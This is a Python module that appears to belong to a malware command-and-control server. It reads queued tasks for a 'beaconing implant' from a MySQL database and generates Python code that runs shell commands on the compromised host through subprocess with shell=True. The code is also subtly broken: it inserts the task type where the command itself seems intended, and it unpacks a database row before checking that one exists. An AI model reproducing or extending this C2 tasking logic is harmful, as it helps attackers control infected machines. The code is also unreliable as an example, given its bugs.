import pymysql
import sys
from colorama import Fore, Style
from core.config import *

class Tasking(object):
    def __init__(self, hostname, current_user, process_id, operating_system):
        self.hostname = hostname
        self.current_user = current_user
        self.process_id = process_id
        self.operating_system = operating_system

        # tries to establish a connection to the database
        try:
            self.connection = pymysql.connect(host="localhost", port=3306, user=username, passwd=password, db=database, autocommit=True)

        # exits the program if an exception is raised
        except:
            print(Style.BRIGHT + Fore.RED + "[!] Unable to establish a database connection." + Style.RESET_ALL)
            sys.exit()

    def check_tasking(self):
        '''
            Description: Checks if anything is tasked for the beaconing implant
        '''
        with self.connection.cursor() as cursor:
            cursor.execute("SELECT `task_action`, `task_secondary` FROM `tasks` WHERE `hostname` = %s AND `process_id` = %s", (self.hostname, self.process_id))
            self.task_action, self.task_secondary = cursor.fetchone()
            row_count = cursor.rowcount

        # if something is tasked
        if row_count == 1:
            # if tasked action is "command"
            if self.task_action == "command":
                self.generate_command_code()

    def generate_command_code(self):
        command = "import subprocess; process = subprocess.Popen('" + self.task_action + "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); output, error = process.communicate(); print output, error;"
        print(command)
